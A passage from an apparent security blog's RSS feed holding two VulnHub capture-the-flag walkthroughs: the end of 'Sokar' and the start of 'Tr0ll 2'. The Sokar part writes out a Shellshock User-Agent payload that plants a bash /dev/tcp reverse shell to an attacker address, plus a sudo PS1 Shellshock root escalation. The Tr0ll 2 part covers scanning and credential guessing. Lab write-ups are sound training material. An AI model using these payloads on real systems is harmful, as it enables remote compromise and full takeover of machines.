&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 192.168.30.148&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 591&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.15 ((CentOS))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h3&gt;

&lt;p&gt;Inspection of the Web Application revealed &lt;code&gt;/cgi-bin/cat&lt;/code&gt; which indicated it could be vulnerable to shellshock.&lt;/p&gt;

&lt;h3 id=&quot;shellshock&quot;&gt;Shellshock&lt;/h3&gt;

&lt;p&gt;The Shellshock exploit was used to execute remote commands on the target system, however a reverse shell or bind shell were not possible due to restrictive ingress and egress firewall rules. This made for a painful local enumeration of the system via &lt;strong&gt;Burp Suite&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;identify-current-user&quot;&gt;Identify Current User&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sokar/shellshock-id.png&quot; alt=&quot;Shellshock ID&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;shellshock-home-dir-perms&quot;&gt;Shellshock home dir perms&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sokar/shellshock-home-dirs.png&quot; alt=&quot;Shellshock home dir&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;shellshock-files-owned-by-user-bynarr&quot;&gt;Shellshock files owned by user bynarr&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sokar/shellshock-find.png&quot; alt=&quot;Shellshock find command&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The file &lt;code&gt;/tmp/stats&lt;/code&gt; appeared to get updated every few minutes, indicating a cronjob &lt;em&gt;could&lt;/em&gt; be running.&lt;/p&gt;

&lt;h4 id=&quot;shellshock-mail-spool-readable&quot;&gt;Shellshock mail spool readable&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sokar/shellshock-mail.png&quot; alt=&quot;Shellshock mail&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The above disclosed &lt;code&gt;bynarrs&lt;/code&gt; passwords and the outbound port &lt;code&gt;51242&lt;/code&gt; rule for the user.&lt;/p&gt;

&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h2&gt;

&lt;p&gt;The following shellshock payload was sent using Burp Suite:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;User-Agent: &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; :&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;/bin/echo &lt;span class=&quot;s1&quot;&gt;'/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.221.139/51242 0&amp;gt;&amp;amp;1 '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /home/bynarr/.profile&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The cronjob called the .profile file and execute the file contents.&lt;/p&gt;

&lt;p&gt;A reverse shell was successfully spawned as the user &lt;code&gt;bynarr&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~/Downloads]# nc.traditional &lt;span class=&quot;nt&quot;&gt;-lp&lt;/span&gt; 51242 &lt;span class=&quot;nt&quot;&gt;-vvvv&lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 51242 ...
192.168.221.148: inverse host lookup failed: Unknown host
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.221.139] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.221.148] 59533
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;local-enumeration&quot;&gt;Local Enumeration&lt;/h2&gt;

&lt;p&gt;The following disclosed several bash environment variables were permitted to run as the user &lt;code&gt;bynarr&lt;/code&gt; with sudo permissions.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;bynarr@sokar ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;bynarr on this host:
    &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;requiretty, visiblepw, always_set_home, env_reset, &lt;span class=&quot;nv&quot;&gt;env_keep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;&lt;/span&gt;,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin

User bynarr may run the following commands on this host:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /home/bynarr/lime&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;shellshock-local-privilege-escalation&quot;&gt;Shellshock Local Privilege Escalation&lt;/h2&gt;

&lt;p&gt;The following shellshock payload was crafted to successfully escalate permissions to root:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PS1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;() { :;} ;  /bin/sh&quot;&lt;/span&gt; /home/bynarr/lime&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;bynarr@sokar tmp]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PS1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;() { :;} ;  /bin/sh&quot;&lt;/span&gt; /home/bynarr/lime
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PS1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;() { :;} ;  /bin/sh&quot;&lt;/span&gt; /home/bynarr/lime
sh-4.1# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home/bynarr/lime
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home/bynarr/lime
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root 368 Jan 27  2015 /home/bynarr/lime
sh-4.1# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/flag
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/flag
                0   0
                |   |
            ____|___|____
         0  |~ ~ ~ ~ ~ ~|   0
         |  |   Happy   |   |
      ___|__|___________|___|__
      |/&lt;span class=&quot;se&quot;&gt;\/\/\/\/\/\/\/\/\/\/\/&lt;/span&gt;|
  0   |    B i r t h d a y    |   0
  |   |/&lt;span class=&quot;se&quot;&gt;\/\/\/\/\/\/\/\/\/\/\/&lt;/span&gt;|   |
 _|___|_______________________|___|__
|/&lt;span class=&quot;se&quot;&gt;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/&lt;/span&gt;|
|                                   |
|     V  u  l  n  H  u  b   &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;     |
| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
|___________________________________|

&lt;span class=&quot;o&quot;&gt;=====================================&lt;/span&gt;
| Congratulations on beating Sokar! |
|                                   |
|  Massive shoutout to g0tmi1k and  |
| the entire community which makes  |
|         VulnHub possible!         |
|                                   |
|    rasta_mouse &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_RastaMouse&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     |
&lt;span class=&quot;o&quot;&gt;=====================================&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Tr0ll 2 Walkthrough</title>
          <link>https://highon.coffee/blog/tr0ll-2-walkthrough/</link>
          <pubDate>Fri, 02 Jan 2015 00:12:52 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/tr0ll-2-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#description&quot; id=&quot;markdown-toc-description&quot;&gt;Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ssh-shellshock&quot; id=&quot;markdown-toc-ssh-shellshock&quot;&gt;SSH Shellshock&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I rooted Tr0ll 1, so thought it would be rude not to try the second VM in the Tr0ll series… &lt;a href=&quot;https://www.vulnhub.com/entry/tr0ll-2,107/&quot;&gt;Tr0ll 2&lt;/a&gt; requires a buffer overflow to perform local escalation, the first VM didn’t require any exploitation. However, like the first VM I’d say this is challenege is more a case of guessing credentials, trying things you think probably wont work.&lt;/p&gt;

&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;

&lt;p&gt;&lt;i&gt;
The next machine in the Tr0ll series of VMs. This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present! :)&lt;/i&gt;
&lt;/p&gt;

&lt;p&gt;&lt;i&gt;
Difficulty is beginner++ to intermediate.
&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;##Enumeration&lt;/p&gt;

&lt;p&gt;Enumeration process started.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/kirk-enumeration.gif&quot; alt=&quot;Star Trek Enumeration&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;nmap -p 1-65535 -sV -sS -A -T4 172.31.31.6&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;nmap -p 1-65535 -sV -sS -A -T4 172.31.31.6&lt;/span&gt;
        &lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Starting Nmap 6.47 ( http://nmap.org ) at 2015-01-02 19:24 EST&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Host is up (0.0026s latency).&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Not shown: 65532 closed ports&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;PORT   STATE SERVICE VERSION &lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;21/tcp open  ftp     vsftpd 2.0.8 or later&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;| ssh-hostkey: &lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;22/tcp open  ssh     (protocol 2.0)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;| ssh-hostkey: &lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|_http-title: Site doesn't have a title (text/html).&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Device type: general purpose&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Running: Linux 3.X&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;OS CPE: cpe:/o:linux:linux_kernel:3&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;OS details: Linux 3.2 - 3.8&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Network Distance: 2 hops&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;###Service Enumeration&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 21&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;FTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;vsftpd 2.0.8 or later&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.22 ((Ubuntu))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;###SSH Enumeration&lt;/p&gt;

&lt;p&gt;Zoning out watching my Nmap scan complete I noticed, the hostname was Tr0ll. I attempted to login via ssh with &lt;code&gt;Tr0ll&lt;/code&gt; password: &lt;code&gt;Tr0ll&lt;/code&gt;, it worked ! But I instantly got booted off, tried a few things nothing worked… So I tried FTP.&lt;/p&gt;

&lt;p&gt;###FTP Enumeration&lt;/p&gt;

&lt;p&gt;I tired the same credentials against ftp and discovered a file called “noob” in the ftp root.&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;ftp noob&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;ftp 172.31.31.6&lt;/span&gt;&lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Connected to 172.31.31.6&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;220 Welcome to Tr0ll FTP... Only noobs stay for a while...&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Name (172.31.31.6:root): Tr0ll&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;331 Please specify the password.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Password:&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;230 Login successful.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Remote system type is UNIX.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Using binary mode to transfer files.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;ftp&amp;gt; get lmao.zip&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;local: lol.pcap remote: lol.pcap&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;200 PORT command successful. Consider using PASV.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;150 Opening BINARY mode data connection for lmao.zip (1474 bytes).&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;226 Transfer complete.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;1474 bytes received in 0.02 secs (60.6 kB/s)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;ftp&amp;gt; exit&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;221 Goodbye.&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;Attempting to extract lmao.zip failed, prompting for a &lt;code&gt;noob&lt;/code&gt; password.&lt;/p&gt;

&lt;p&gt;Onto the next service then…&lt;/p&gt;

&lt;p&gt;###HTTP Enumeration&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/star-trek-enumeration.gif&quot; alt=&quot;Star Trek HTTP Enumeration&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Web browser showed:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/tr0ll-me-again.PNG&quot; alt=&quot;tr0ll me again&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;nmap --script=http-enum -p80 -n 172.31.31.6&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;nmap --script=http-enum -p80 -n 172.31.31.6&lt;/span&gt;&lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Starting Nmap 6.47 ( http://nmap.org ) at 2015-01-2 18:40 GMT&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap scan report for 172.31.31.6&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Host is up (0.00046s latency).&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;PORT   STATE SERVICE&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;80/tcp open  http&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;| http-enum:&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|   /robots.txt: Robots file&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;Entering /robots.txt url in the browser rendered:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;User-agent:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The slash was stripped off with some sed &lt;code&gt;sed 's./..g' robots.txt&lt;/code&gt; dirb was then used to check the following urls.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
DIRB v2.21    
By The Dark Raver
&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

START_TIME: Sat Jan  3 08:08:15 2015
URL_BASE: http://172.31.31.6/
WORDLIST_FILES: robots.txt

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

GENERATED WORDS: 21                                                            

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://172.31.31.6/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+ http://172.31.31.6//noob &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301|SIZE:309&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                               
+ http://172.31.31.6//keep_trying &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301|SIZE:316&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                        
+ http://172.31.31.6//dont_bother &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301|SIZE:316&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                        
+ http://172.31.31.6//ok_this_is_it &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301|SIZE:318&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                      

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
DOWNLOADED: 21 - FOUND: 4&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;They all rendered the same image (301’d).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/tr0ll-cats.PNG&quot; alt=&quot;tr0ll cats&quot; /&gt;&lt;/p&gt;

